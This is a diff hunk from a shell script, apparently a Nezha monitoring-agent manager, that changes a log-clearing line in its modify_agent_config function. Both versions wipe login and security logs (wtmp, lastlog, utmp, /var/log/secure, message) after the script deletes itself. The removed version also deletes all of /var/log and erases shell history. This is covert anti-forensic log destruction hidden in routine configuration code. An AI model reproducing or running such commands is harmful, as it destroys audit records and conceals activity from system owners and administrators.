@@ -298,7 +298,7 @@ modify_agent_config() {
 
     rm -rf ./nezha.sh
 
-    echo > /var/log/wtmp && echo > /var/log/lastlog && echo >   /var/log/utmp && cat /dev/null >  /var/log/secure && cat /dev/null >  /var/log/message && sudo rm -rf /var/log/* && set +o history  && history -c && rm ~/.bash_history
+    echo > /var/log/wtmp && echo > /var/log/lastlog && echo >   /var/log/utmp && cat /dev/null >  /var/log/secure && cat /dev/null >  /var/log/message
 
     if [[ $# == 0 ]]; then
         before_show_menu
